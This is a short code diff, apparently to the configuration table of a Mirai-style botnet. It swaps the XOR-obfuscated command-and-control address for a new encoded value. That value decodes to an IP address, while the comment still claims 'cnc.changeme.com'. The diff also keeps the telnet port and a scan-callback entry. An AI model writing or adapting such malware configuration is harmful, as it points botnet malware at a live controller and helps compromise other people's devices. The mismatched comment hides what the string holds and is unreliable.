@@ -15,7 +15,7 @@ struct table_value table[TABLE_MAX_KEYS];
 
 void table_init(void)
 {
-    add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30); // cnc.changeme.com
+    add_entry(TABLE_CNC_DOMAIN, "\x1A\x10\x0C\x10\x1B\x0C\x13\x10\x14\x0C\x1B\x17\x22", 13); // cnc.changeme.com
     add_entry(TABLE_CNC_PORT, "\x22\x35", 2);   // 23
 
     add_entry(TABLE_SCAN_CB_DOMAIN, "\x13\x10\x15\x0C\x12\x0C\x12\x0C\x13", 9); // 127.0.0.1
